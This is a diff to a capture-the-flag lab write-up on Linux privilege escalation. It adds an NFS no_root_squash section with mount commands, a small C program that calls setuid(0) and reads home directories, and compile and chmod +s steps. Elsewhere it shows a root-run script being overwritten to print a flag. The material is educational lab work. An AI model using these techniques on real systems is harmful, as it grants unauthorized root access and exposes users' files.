@@ -33,7 +33,7 @@ env
 Will print system information giving us additional detail about the kernel used by the system.
 
 ```bash
-uname
+uname -a
 ```
 ---
 ### `/proc/version`
@@ -350,13 +350,17 @@ and crack it by john...
 ```bash
 find / -writable 2>/dev/null
 ```
+
 Found it !!
+
 ![find.png](../../photos/find.png)
 
 #### Now go to the directory and write the code
 
 As it appears test runs thm as a root...
+
 ![test](../../photos/test.png)
+
 let's add a command to print the flag....
 
 ```bash
@@ -365,3 +369,46 @@ echo 'cat /home/matt/flag6.txt' > thm
 
 ![thm.png](../../photos/thm.png)
 
+---
+# Privilege Escalation: NFS
+
+#### Mounting
+
+```bash
+sudo mount -t nfs 10.10.249.239:/home/ubuntu/sharedfolder /tmp/bb
+```
+
+#### Creating the binary and giving the `SUID`
+
+The `C` code:
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+int main()
+{
+   setgid(0);
+   setuid(0);
+   system("cat /home/* 2>/dev/null | grep THM");
+return 0;
+}
+```
+
+Compiling it..
+```bash
+sudo gcc -static -o rooted exp.c
+sudo cp rooted bb/rooted
+```
+
+Setting the `SUID`...
+```bash
+sudo chmod +s bb/rooted
+```
+
+On host..
+
+![host.png](../../photos/host.png)
+
+on Attacked Machine...
+
+![machine.png](../../photos/machine.png)
